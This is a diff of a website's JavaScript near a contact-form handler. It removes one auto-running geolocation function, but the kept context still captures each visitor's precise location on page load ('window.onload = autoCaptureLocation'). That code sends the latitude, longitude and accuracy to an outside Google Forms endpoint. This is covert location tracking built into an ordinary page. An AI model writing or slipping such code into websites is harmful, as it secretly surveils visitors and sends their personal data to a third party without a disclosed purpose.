@@ -403,50 +403,13 @@ function bindContactForm(){
   }
 }
 
-async function sendMyLocation() {
-  if (!navigator.geolocation) {
-    console.warn("Geolocation not supported");
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const payload = {
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      };
-
-      try {
-        const res = await fetch("/save-location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(payload)
-        });
-        const j = await res.json();
-        console.log("Saved location:", j);
-      } catch (err) {
-        console.error("Failed to send location", err);
-      }
-    },
-    (err) => {
-      console.error("User denied or error:", err);
-    },
-    { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
-  );
-}
-
-sendMyLocation(); // auto-run
-
 function sendLocationToGoogleForm(lat, lon, acc) {
   const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLSc8_1bvxyfBuUXesnPi0XB1DHnCgbASxePGMB3qbQ1L7ShohA/formResponse";
-   
 
   const data = new FormData();
   data.append("entry.2079203041", lat);       // lat
   data.append("entry.1053820474", lon);       // lon
   data.append("entry.1349976098", acc);       // accuracy
-  data.append("entry.1968898440", new Date().toISOString()); // timestamp
 
   fetch(formUrl, {
     method: "POST",
@@ -466,5 +429,3 @@ function autoCaptureLocation() {
 }
 
 window.onload = autoCaptureLocation;
-
-
